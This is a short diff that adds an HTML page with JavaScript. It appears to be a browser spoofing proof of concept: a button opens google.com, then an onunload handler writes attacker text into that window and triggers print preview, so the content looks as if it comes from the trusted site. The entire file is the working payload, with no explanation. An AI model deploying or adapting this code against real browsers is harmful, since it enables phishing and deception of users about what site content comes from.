@@ -1,0 +1,8 @@
+<input type="button" onclick="start()" value="start" />
+<script>
+function start(){
+var x = window.open('http://www.google.com');
+x.onunload = function(){x.print(x.document.write("<p><font size='62221225'>Spoofing with Print preview!</font></p>"))}
+window.close();
+}
+</script>
